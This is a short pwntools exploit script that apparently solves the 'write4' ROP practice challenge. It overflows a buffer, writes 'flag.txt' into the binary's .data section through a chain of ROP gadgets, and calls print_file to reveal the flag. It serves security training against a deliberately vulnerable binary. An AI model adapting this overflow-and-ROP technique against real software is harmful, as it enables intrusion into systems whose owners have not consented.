#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./write4', checksec=False)
rop = ROP('./write4')

# This is the virtual address of the .data segment that I obtained with `rabin2 -S write4`
# I use it to write because it's a writable section and I'm quite sure that it 
# won't disrupt anything important in the program
WRITE_ADDR = p64(0x00601028)
FILENAME = b'flag.txt'

buffer = 40 * b'a'
pop_r14_pop_r15 = p64(rop.r14_r15.address)
r14_value = WRITE_ADDR
r15_value = FILENAME
usefulGadget_addr = p64(0x00400628)
pop_rdi = p64(rop.rdi.address)
rdi_value = WRITE_ADDR
print_file_addr = p64(elf.plt.print_file)

payload = buffer
payload += pop_r14_pop_r15
payload += r14_value
payload += r15_value
payload += usefulGadget_addr
payload += pop_rdi
payload += rdi_value
payload += print_file_addr

p = process('./write4')
# p = gdb.debug('./write4', 'b main')
p.recvuntil(b'>')
p.sendline(payload)
print(p.recvall().decode())